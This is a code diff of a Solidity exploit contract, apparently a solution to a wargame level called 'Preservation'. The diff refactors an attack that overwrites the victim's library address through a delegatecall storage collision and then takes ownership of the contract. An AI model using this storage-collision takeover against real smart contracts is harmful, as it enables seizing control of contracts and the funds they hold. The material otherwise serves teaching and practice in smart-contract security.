@@ -8,20 +8,15 @@ contract PreservationAttack {
     address private slot0;
     address private slot1;
     uint256 private slot2;
-    IPreservation private immutable victimPreservation;
 
-    constructor(IPreservation victimPreservation_) {
-        victimPreservation = victimPreservation_;
-    }
+    function attack(IPreservation target) external {
+        target.setFirstTime(uint256(uint160(address(this))));
 
-    function attack() external {
-        victimPreservation.setFirstTime(uint256(uint160(address(this))));
+        require(address(this) == target.timeZone1Library(), "Preservation: Wrong address");
 
-        require(address(this) == victimPreservation.timeZone1Library(), "Preservation: Wrong address");
+        target.setFirstTime(uint256(uint160(msg.sender)));
 
-        victimPreservation.setFirstTime(uint256(uint160(msg.sender)));
-
-        require(msg.sender == victimPreservation.owner(), "Preservation: Attack failed");
+        require(msg.sender == target.owner(), "Preservation: Attack failed");
     }
 
     function setTime(uint256 _time) public {
